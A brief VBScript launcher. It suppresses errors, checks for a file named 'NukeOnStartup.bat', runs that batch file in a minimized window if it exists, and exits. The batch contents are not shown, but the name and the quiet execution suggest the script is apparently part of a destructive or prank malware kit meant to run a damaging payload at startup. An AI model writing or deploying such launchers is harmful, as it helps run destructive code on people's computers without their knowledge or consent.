set sh = wscript.createobject("wscript.shell")
set Check = createobject("scripting.filesystemobject")
On Error Resume Next
wscript.sleep 100
If (Check.fileExists("NukeOnStartup.bat")) then
sh.run "NukeOnStartup.bat", 2
wscript.quit
Else
wscript.quit
End If